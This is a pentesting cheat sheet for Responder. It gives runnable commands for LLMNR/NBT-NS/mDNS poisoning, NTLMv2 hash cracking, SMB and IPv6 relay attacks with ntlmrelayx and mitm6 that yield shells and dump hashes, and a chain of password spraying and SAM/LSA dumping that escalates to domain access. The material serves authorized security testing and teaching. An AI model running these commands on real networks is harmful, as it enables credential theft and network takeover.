# Responder Reference

Practical reference for Responder: LLMNR/NBT-NS/mDNS poisoning for credential capture on internal networks.

## Table of Contents

1. [Core Concept](#1-core-concept)
2. [Basic Usage](#2-basic-usage)
3. [Cracking Captured Hashes](#3-cracking-captured-hashes)
4. [SMB Relay (When Signing Is Disabled)](#4-smb-relay-when-signing-is-disabled)
5. [IPv6 / mitm6 Variant](#5-ipv6--mitm6-variant)
6. [Field Notes](#6-field-notes)

---

## 1. Core Concept

Windows falls back to LLMNR/NBT-NS/mDNS broadcast name resolution when DNS fails to resolve a name: a mistyped share, a stale DNS entry, anything. Responder answers those broadcast queries as if it were the requested host, and the querying machine authenticates to it, handing over an NTLMv2 challenge/response hash. No exploit involved; it's an inherent trust weakness in legacy name resolution protocols that's usually enabled by default.

## 2. Basic Usage

```
sudo responder -I eth0 -dPv     # -d: LLMNR/NBT-NS/mDNS poisoning on, -P: force basic auth prompt, -v: verbose
sudo responder -I eth0 -dwP     # -w: start WPAD rogue proxy server too
```

Interface should be whatever's on the target broadcast segment: `eth0` on a wired lab connection, `tun0`/`tap0` if you're on a VPN into the target range.

Captured hashes show up live in the terminal and get written to `/usr/share/responder/logs/`.

## 3. Cracking Captured Hashes

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt      # NTLMv2 mode
john --format=netntlmv2 hash.txt --wordlist=rockyou.txt        # John alternative
```

## 4. SMB Relay (When Signing Is Disabled)

If SMB signing is disabled on target machines, relaying a captured auth attempt straight through to a target (instead of just capturing the hash to crack) gets you a session directly, no cracking required.

```
# Check first: this attack only works where SMB signing is disabled
nmap -p445 10.10.10.0/24 --script=smb2-security-mode

# Disable Responder's own SMB/HTTP servers so it doesn't grab the auth itself before you can relay it
sudo nano /etc/responder/Responder.conf
# set SMB = Off
# set HTTP = Off

sudo responder -I eth0 -dPv

# Relay captured auth to a list of targets
sudo ntlmrelayx.py -tf targets.txt -smb2support              # dump hashes
sudo ntlmrelayx.py -tf targets.txt -smb2support -i           # drop into an interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"  # run a one-off command to confirm access
```

## 5. IPv6 / mitm6 Variant

Most networks have IPv6 enabled but no IPv6 DNS server. `mitm6` impersonates one, and combined with `ntlmrelayx` gives another relay path even when the SMB-signing path above is locked down.

```
sudo mitm6 -d corp.local
ntlmrelayx.py -6 -t ldaps://10.10.10.100 -wh fakewpad.corp.local -l loot
```

## 6. Field Notes

**The real value of a captured hash usually isn't cracking it: it's the pivot.** The methodology that actually gets you somewhere on an internal network assessment looks like:

```
LLMNR/NBT-NS poison (Responder)
  → capture a hash
  → crack it offline (hashcat)
  → spray the cracked password across the subnet (find where else it's valid)
  → land on a box where it works
  → dump local secrets there (SAM/LSA)
  → get local admin hashes
  → re-spray the network with those local hashes
  → repeat until something gives domain-level access
```

One cracked password is rarely the goal by itself: it's the first rung. Treat every credential you get as something to re-test broadly, not just apply once and move on.
